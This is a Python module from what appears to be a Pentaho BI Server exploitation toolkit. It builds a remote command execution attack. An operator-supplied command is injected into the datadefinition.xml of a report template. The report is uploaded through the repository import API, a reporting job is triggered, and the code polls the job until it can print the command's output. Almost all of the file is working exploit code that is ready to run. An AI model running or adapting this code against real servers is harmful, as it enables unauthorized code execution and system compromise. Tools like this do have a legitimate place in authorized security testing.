#!/usr/bin/python3
from modules import config
import zipfile
import os
import time
import json
import re

def run_command():
	if config.is_anon:
		return
	ROOT_DIR = os.path.dirname(os.path.abspath(__file__))
	cmd = input('Command to run: ').encode()
	with zipfile.ZipFile(ROOT_DIR + "/" + 'payload.prpt') as inzip, zipfile.ZipFile('whoami2.prpt', 'w') as outzip:
		# Iterate the input files
		for inzipinfo in inzip.infolist():
			# Read input file
			with inzip.open(inzipinfo) as infile:
				if inzipinfo.filename == "datadefinition.xml":
					content = infile.read()
					# Modify the content of the file by replacing a string
					content = content.replace(b"$command", cmd)
					# Write content
					outzip.writestr(inzipinfo.filename, content)
				else:
					outzip.writestr(inzipinfo.filename, infile.read())

	# try to upload a file in default user directory
	print("- Uploading cmd payload")
	files = {'fileUpload': open('whoami2.prpt','rb')}
	values = {"overwriteFile": "true", "logLevel": "ERROR", "retainOwnership": "true", "fileNameOverride": "whoami2.prpt", "importDir": "/home/"+config.username}

	r = config.session.post(f"{config.pentaho_path}/api/repo/files/import", files=files, data=values, proxies=config.proxies)
	
	if r.status_code != 200:
		print('Sorry, something went wrong')
		print(r.text)
		return
	#
	# TODO handle fail upload
	#
	
	# 4. Execute file

	print("- Sending parameters")
	values = {"output-target":"pageable/text","accepted-page":"0","showParameters":"true","renderMode":"PARAMETER","htmlProportionalWidth":"false","query-limit-ui-enabled":"true","query-limit":"0","maximum-query-limit":"0", "ts": int(time.time())}
	response = config.session.post(f"{config.pentaho_path}/api/repos/%3Ahome%3A{config.username}%3Awhoami2.prpt/parameter", proxies=config.proxies, data=values)



	print("- Reserving ID")
	#reserve ID
	response = config.session.post(f"{config.pentaho_path}/plugin/reporting/api/jobs/reserveId", proxies=config.proxies)
	json_res = json.loads(response.text)
	reserve_id = json_res["reservedId"]

	print("Sending the Job")
	values = {"output-target":"pageable/text","accepted-page":"0","showParameters":"true","renderMode":"REPORT","htmlProportionalWidth":"false","query-limit-ui-enabled":"true","query-limit":"0","maximum-query-limit":"0","reservedId":reserve_id, "ts": int(time.time())}
	response = config.session.post(f"{config.pentaho_path}/api/repos/%3Ahome%3A{config.username}%3Awhoami2.prpt/reportjob", proxies=config.proxies, data=values)

	while True:
		response = config.session.get(f"{config.pentaho_path}/plugin/reporting/api/jobs/{reserve_id}/status",  proxies=config.proxies)
		json_res = json.loads(response.text)
		if json_res["status"] == "FINISHED":
			break
		if json_res["status"] == "FAILED":
			print("Upsi, something went wrong")
			break
		print("Job still running")
		time.sleep(2)
	
	response = config.session.post(f"{config.pentaho_path}/plugin/reporting/api/jobs/{reserve_id}/content", proxies=config.proxies)
	out_str = str(response.text)
	out_str2 = out_str.strip()
	out_str3 = out_str2.replace("\r\n"," ")
	out_str4 = re.sub("  ", "", out_str3)
	print("\nCommand Result: " + out_str4)
